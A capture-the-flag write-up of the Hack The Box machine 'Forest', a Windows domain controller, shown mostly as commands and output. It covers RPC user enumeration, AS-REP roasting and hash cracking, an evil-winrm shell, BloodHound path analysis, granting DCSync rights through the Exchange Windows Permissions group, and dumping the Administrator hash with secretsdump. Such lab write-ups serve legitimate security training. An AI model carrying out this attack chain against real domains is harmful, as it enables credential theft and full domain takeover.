---
title: Hack The Box - Forest
date: 2025-07-05
categories: [hackthebox]
tags: [windows,Active Directory,smbmap,smbclient,Bloodhound,Dcsync,Easy]
comments: true
toc: true
---

Forest is an easy Windows machine. It is a domain controller that allows us to enumerate users over RPC, attack Kerberos with AS-REP Roasting for a service account, and gain an initial foothold.
The service account is found to be a member of the Account Operators group, which can be used to add users to the Exchange Windows Permissions group and then perform a DCSync attack to dump the NTLM hash and obtain the Administrator shell.

<img src="/assets/Hackthebox/Forest/image-3.png" width="90%" height="70%">


## Recon
### Nmap
Starting with nmap. nmap found a bunch of open ports.
```bash
sudo nmap -p- 10.10.10.161 --min-rate 10000 -oN forest.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-05 21:53 CDT
Nmap scan report for 10.10.10.161
Host is up (0.11s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49956/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.01 seconds

$sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49956 10.10.10.161 -oN forest-service.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-05 21:54 CDT
Nmap scan report for 10.10.10.161
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-06 00:44:10Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49956/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-06T00:45:02
|_  start_date: 2025-07-06T00:32:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 9m05s, deviation: 4h02m31s, median: -2h10m56s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-07-05T17:45:04-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.60 seconds

```
Open ports like LDAP and Kerberoas confirms that this is a Domain Controller for the domain htb.local. nmap also reveals that this is a windows server 2016.


/etc/hosts

we will add the domain name to the hosts file
`10.10.10.161 forest.htb.local htb.local`

### SMB Enumeration
Smbmap didnot allows us to list the shares without a valid credentials.

```bash
smbmap -H 10.10.10.161 -u '' -p '' 
[+] IP: 10.10.10.161:445	Name: 10.10.10.161 
```
### RPC - TCP 445

we can check over RPC to enumerate users. We can use `rpcclient` for this. we can get a list of usersnames with `enumdomusers` on `rpcclient`.

```bash
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

```
We can also get a list of groups using `enudomgroups` 

```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

```
We can also view the number of group members of a group.

```bash
rpcclient $> querygroup 0x200
	Group Name:	Domain Admins
	Description:	Designated administrators of the domain
	Group Attribute:7
	Num Members:1
rpcclient $> querygroup 0x206
	Group Name:	Schema Admins
	Description:	Designated administrators of the schema
	Group Attribute:7
	Num Members:1
rpcclient $> 

```
## Shell as Svc-alfresco
### Asrep roasting

we will add all the usernames in a list.
Since we have a list of valid users, now we can check if there is any account that have propery "Do not require Kerberos preauthentication" or "UF_DONT_REQUIRE_PREAUTH" set to true. For this, we will utilize `impacket-GetNPUsers` and try to get the hash for the user.

```bash
impacket-GetNPUsers htb.local/ -no-pass -dc-ip 10.10.10.161 -usersfile users.txt 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0987a16611644081aba095f6b57b3ea7$f8ee77afeba5bff918766b265c8c33d57e34cd8cbcaa7c020ca740160e8f877520909135f56db2d900311733d824892ab862b2d408cd0c323b0984652e9deea2bd8e8bfa8dd871c47f1c82f5bbe91db461b7ec3ea7502bde534ba3f6cf2a739206a9463d79c95d2f94f93654533beb0220c74238899c187f0508b5662f60053b217b845d52fb8775c5805c1a1f4882faa36712c2badff0cb27381692e0be1e9b0a2a16bd93d59134477f3b41f9a7ac4e115a738b1e74732296edc551efce53aecf0b7e42b448f7bda649343e90f20e62390529890099447e2b616edd101787a2e95cdce71072
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```
We got the hash of svc-alfresco. That means this user is vulnerable to asrep-roasting attack.

### Hashcat

we will add hash of this user in a hash.txt file and use hashcat to crack it.
```bash
$hashcat hash.txt /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:0987a16611644081aba095f6b57b3ea7$f8ee77afeba5bff918766b265c8c33d57e34cd8cbcaa7c020ca740160e8f877520909135f56db2d900311733d824892ab862b2d408cd0c323b0984652e9deea2bd8e8bfa8dd871c47f1c82f5bbe91db461b7ec3ea7502bde534ba3f6cf2a739206a9463d79c95d2f94f93654533beb0220c74238899c187f0508b5662f60053b217b845d52fb8775c5805c1a1f4882faa36712c2badff0cb27381692e0be1e9b0a2a16bd93d59134477f3b41f9a7ac4e115a738b1e74732296edc551efce53aecf0b7e42b448f7bda649343e90f20e62390529890099447e2b616edd101787a2e95cdce71072:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:0987a166116440...e71072
Time.Started.....: Sat Jul  5 19:59:02 2025 (9 secs)
Time.Estimated...: Sat Jul  5 19:59:11 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   473.2 kH/s (1.68ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344385 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4084736/14344385 (28.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s456822 -> s3r3ndipit
Hardware.Mon.#1..: Util: 91%

Started: Sat Jul  5 19:58:33 2025
Stopped: Sat Jul  5 19:59:12 2025

```

We can see that the hash has been cracked and the password is s3rvice.

we will use netexec with this creds to check if we can winrm and get a shell.

```bash
$netexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```
And it works. Now we will use evil-winrm to get the shell.

```bash
$evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.5
                                        
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```
## Shell as Administrator

With this shell, we can upload `SharpHound.exe` and collect data to further enumerate. 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload SharpHound.exe

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ./SharpHound.exe -c All
<SNIP>>
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-07-05T18:16:01.7277200-07:00|INFORMATION|SharpHound Enumeration Completed at 6:16 PM on 7/5/2025! Happy Graphing!

```
We will now download the zip file on our machine, extract the zip contents and the load into the bloodhoud for analysis. Once the data has been loaded into the bloodhound we can check the interesting queries.First, we will search for the svc-alfresco user, and mark it as owned. It's found that svc-alfresco is a member of six groups
through nested membership.

![alt text](/assets/Hackthebox/Forest/image-1.png)

One of the nested group is `Account Operators` which is a privileged AD group. According to the [documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators), the Account Operators group members are allowed to create and modify users and add them to non-protected groups.

When we check the "Shortest Path to High Value targets", we can see the following graph.

![alt text](/assets/Hackthebox/Forest/image.png)

One of the paths shows that the `Exchange Windows Permissions group` has WriteDacl privileges on the Domain. The `WriteDACL` privilege allows a user to add ACLs to an object. We can add users to this group and give them `DCSync` privileges. 


From the winrm shell, we will add a user `tester` with password `test@123`.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user tester  test@123 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
DefaultAccount           Guest                    HealthMailbox0659cc1
HealthMailbox670628e     HealthMailbox6ded678     HealthMailbox7108a4e
HealthMailbox83d6781     HealthMailbox968e74d     HealthMailboxb01ac64
HealthMailboxc0a90c9     HealthMailboxc3d7722     HealthMailboxfc9daad
HealthMailboxfd87238     krbtgt                   lucinda
mark                     santi                    sebastien
SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb     SM_2c8eef0a09b545acb
SM_681f53d4942840e18     SM_75a538d3025e4db9a     SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b     SM_ca8c2ed5bdab4dc9b
svc-alfresco             tester                   
The command completed with one or more errors.

```
Then, we will add user tester to the `Exchange Windows Permissions` group.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" tester /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user tester
User name                    tester
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/6/2025 8:15:06 AM
Password expires             Never
Password changeable          7/7/2025 8:15:06 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.

```

We can see that the `tester` user is now a member of `Exchange Windows Permissions` groups.

On the graph when we click on writeDACL it shows us how we can abuse it.
According to the bloodhound, first we need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS. Since we are not running a process as a member we need to create a PSCredential object and the use `Pwerview's Add-ObjectACL` to grant tester user Dcsync rights.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'test@123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb.local\tester', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity tester -Credential $cred -Rights DCSync
```

Now we can either use mimikatz or impacket-secretsdump to get the administrator hash.

```bash

impacket-secretsdump htb.local/tester@10.10.10.161 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>

```

Now, we can get administrator shell using the hash with evil-winrm.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/5/2025   5:32 PM             34 root.txt

```